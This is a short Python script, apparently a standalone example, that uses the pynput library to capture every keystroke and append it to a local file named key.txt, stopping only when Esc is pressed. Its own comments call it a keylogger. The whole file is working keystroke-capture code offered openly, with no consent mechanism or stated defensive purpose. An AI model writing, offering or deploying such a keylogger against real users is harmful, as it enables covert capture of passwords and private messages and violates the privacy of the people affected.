import pynput.keyboard

log_file = "key.txt"  # path to the log file

def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write('Key pressed: {0}\n'.format(key.char))
    except AttributeError:
        with open(log_file, "a") as file:
            file.write('Special key pressed: {0}\n'.format(key))

def on_release(key):
    if key == pynput.keyboard.Key.esc:
        # Stop the keylogger when the Esc key is pressed
        return False

# Create listener instances
keyboard_listener = pynput.keyboard.Listener(on_press=on_press, on_release=on_release)

# Start the listener to monitor keyboard events
keyboard_listener.start()

# Keep the main thread running
keyboard_listener.join()